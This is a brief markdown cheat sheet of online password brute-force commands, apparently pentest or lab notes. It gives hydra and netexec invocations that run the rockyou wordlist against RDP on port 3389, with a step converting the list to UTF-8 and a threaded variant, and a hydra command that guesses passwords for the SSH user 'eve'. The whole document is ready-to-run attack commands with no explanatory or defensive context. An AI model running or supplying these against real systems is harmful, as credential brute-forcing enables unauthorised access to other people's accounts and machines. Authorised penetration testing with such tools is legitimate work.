# RDP
### hydra
```
hydra -l user -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.0.0
```
### netexec
```
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o /tmp/rockyou-utf8.txt
```

use default
```
netexec rdp 192.168.x.x -u user -p /tmp/rockyou-utf8.txt
```

thread 20
```
netexec rdp 192.168.x.x -u user -p /tmp/rockyou-utf8.txt -t 20
```

# ssh

### hydra
```
hydra -l eve -P wordlist 192.168.x.x -t 4 ssh -V
```
